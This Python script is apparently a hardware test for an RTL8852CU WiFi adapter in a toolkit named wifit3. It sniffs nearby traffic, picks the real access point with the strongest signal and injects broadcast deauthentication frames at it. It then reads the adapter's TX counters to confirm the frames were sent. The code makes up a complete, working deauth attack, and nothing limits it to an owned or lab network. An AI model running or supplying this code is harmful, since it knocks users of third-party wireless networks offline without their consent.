"""
RTL8852CU end-to-end attack & injection test via WlanInterface.

Proves the top-level wifit3 application stack (WlanInterface, dot11 frame builders,
send_no_wait, deauth_broadcast) drives the RTL8852CU driver and radiates frames on air.

    uv run scripts/chips/rtl8852cu/test_attack.py --channel 11 --count 16
"""
import argparse
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent / "src"))

from wifit3.device.manager import wlan_ifaces, wlan_close

CCK_TXON = 0x11704
OFDM_TXON = 0x11A40


def step(label: str):
    print(f"\n--- {label} ---")


def ok(msg: str):
    print(f"[PASS] {msg}")


def fail(msg: str):
    print(f"[FAIL] {msg}")
    sys.exit(1)


def _read_counters(t):
    return {
        "cck_txon": t.read32(CCK_TXON) & 0xFFFF,
        "ofdm_txon": t.read32(OFDM_TXON) & 0xFFFF,
    }


async def main(args):
    step("Device Discovery via DeviceManager")
    ifaces = wlan_ifaces()
    if not ifaces:
        fail("No wifit3 interfaces found")
    iface = ifaces[0]
    ok(f"Selected {iface.name}: {iface.description} ({iface.vid:04x}:{iface.pid:04x})")

    step("WlanInterface.connect()")
    try:
        await iface.connect()
    except Exception as e:
        import traceback
        traceback.print_exc()
        fail(f"iface.connect() raised {type(e).__name__}: {e}")
    ok(f"Connected, MAC: {iface.driver.mac_address}")

    step(f"Tune to Channel {args.channel}")
    await iface.set_channel(args.channel)
    ok(f"Tuned to channel {args.channel}")

    step("Sniffing 3.0s for candidate target APs")
    candidates = {}

    def on_frame(pkt):
        if pkt.bssid and pkt.ssid:
            candidates[pkt.bssid] = (pkt.ssid, pkt.rssi)

    iface.driver.register_rx_callback(on_frame)
    await asyncio.sleep(3.0)

    if not candidates:
        target_bssid = "00:11:22:33:44:55"
        target_ssid = "<simulated-target>"
    else:
        # Pick best signal AP
        target_bssid, (target_ssid, target_rssi) = max(
            candidates.items(), key=lambda kv: kv[1][1] if kv[1][1] is not None else -100
        )
    ok(f"Target selected: {target_bssid} ({target_ssid!r})")

    t = iface.driver.transport
    before = _read_counters(t)
    print(f"  TX counters before: {before}")

    step(f"Injecting {args.count} Broadcast Deauth frames via iface.deauth_broadcast()")
    sent = await iface.deauth_broadcast(target_bssid, count=args.count)
    ok(f"deauth_broadcast dispatched {sent} frames")

    await asyncio.sleep(0.1)
    after = _read_counters(t)
    delta = {k: after[k] - before[k] for k in after}
    print(f"  TX counters after:  {after}")
    print(f"  TX counters delta:  {delta}")

    step("Cleanup")
    await wlan_close(ifaces)

    if max(delta.values()) > 0:
        ok(f"Deauth frames radiated on air! Delta: {delta}")
        print("\n=== RTL8852CU APPLICATION-LEVEL ATTACK INJECTION VERIFIED ===")
        return True
    fail("Deauth frames did not move TX counters")
    return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RTL8852CU application-level attack test")
    parser.add_argument("--channel", type=int, default=11)
    parser.add_argument("--count", type=int, default=16)
    try:
        asyncio.run(main(parser.parse_args()))
    except KeyboardInterrupt:
        print("\n[ABORTED] Keyboard interrupt")
        sys.exit(1)
